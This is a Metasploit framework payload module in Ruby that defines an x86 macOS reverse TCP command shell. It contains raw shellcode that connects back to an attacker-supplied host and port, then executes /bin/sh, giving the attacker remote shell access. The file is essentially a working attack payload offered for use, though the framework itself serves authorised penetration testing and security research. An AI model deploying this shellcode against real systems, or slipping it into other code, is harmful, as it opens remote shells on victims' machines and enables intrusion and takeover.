##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'OS X Command Shell, Reverse TCP Inline',
      'Description' => 'Connect back to attacker and spawn a command shell',
      'Author'      => 'Ramon de C Valle',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShellUnix,
      'Payload'     =>
        {
          'Offsets' =>
            {
              'LHOST' => [1, 'ADDR'],
              'LPORT' => [8, 'n'],
            },
          'Payload' =>
            "\x68\x7f\x00\x00\x01\x68\xff\x02\x11\x5c\x89\xe7\x31\xc0\x50\x6a\x01\x6a\x02\x6a\x10\xb0\x61" +
            "\xcd\x80\x57\x50\x50\x6a\x62\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68\x2f" +
            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80"
        }
      ))
  end
end
